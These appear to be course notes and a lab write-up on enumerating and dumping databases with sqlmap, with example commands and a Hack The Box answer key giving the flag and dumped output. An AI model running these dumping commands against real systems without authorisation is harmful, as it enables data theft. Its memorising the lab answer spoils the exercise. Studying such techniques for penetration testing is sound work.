# Database Enumeration
## Basic DB Data Enumeration
Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch --banner)
- Current user name (switch --current-user)
- Current database name (switch --current-db)
- Checking if the current user has DBA (administrator) rights (switch --is-dba)

```sh
$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## Table Enumeration
In most common scenarios, after finding the current database name (i.e. `testdb`), the retrieval of table names would be by using the `--tables` option and specifying the DB name with `-D testdb`:

```sh
$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

After spotting the table name of interest, retrieval of its content can be done by using the `--dump` option and specifying the table name with `-T users`:

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

## Table/Row Enumeration

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options:

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration
If there is a requirement to retrieve certain rows based on a known `WHERE` condition:

```sh
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full DB Enumeration
As for the `--dump-all` switch, all the content from all the databases will be retrieved. In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

## Questions
1. What's the contents of table flag1 in the testdb database? (Case #1) **Answer: HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}**
   - Dump the `testdb.flag1` table with:
        ```sh
        $ sqlmap -u 'http://154.57.164.69:32239/case1.php?id=1*' --batch --level 5 --risk 3 --threads 10 -T flag1 -D testdb --dump
        <SNIP>
        Database: testdb
        Table: flag1
        [1 entry]
        +----+-----------------------------------------------------+
        | id | content                                             |
        +----+-----------------------------------------------------+
        | 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
        +----+-----------------------------------------------------+
        <SNIP>
        ```